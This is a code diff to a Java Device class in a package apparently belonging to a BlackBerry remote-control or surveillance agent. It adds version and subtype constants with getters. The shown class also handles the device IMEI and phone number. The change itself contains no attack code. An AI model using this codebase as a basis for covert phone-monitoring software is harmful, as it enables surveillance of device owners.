@@ -12,6 +12,7 @@ import com.ht.rcs.blackberry.interfaces.Singleton;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
+import com.ht.rcs.blackberry.utils.Utils;
 import com.ht.rcs.blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
@@ -23,6 +24,12 @@ public class Device implements Singleton {
     /** The debug. */
     private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);
 
+    
+    public final static long Version = 20104010932L;
+    public final static String SubType = "BB";
+    
+
+    
     /** The imei. */
     String imei = "";
 
@@ -96,5 +103,14 @@ public class Device implements Singleton {
         byte[] encoded = WChar.getBytes(phoneNumber);
         return encoded;
     }
+
+	public static byte[] getVersion() {
+		return Utils.longToByteArray(Version);
+	}
+
+	public static byte[] getSubtype() {
+		
+		return SubType.getBytes();
+	}
 
 }
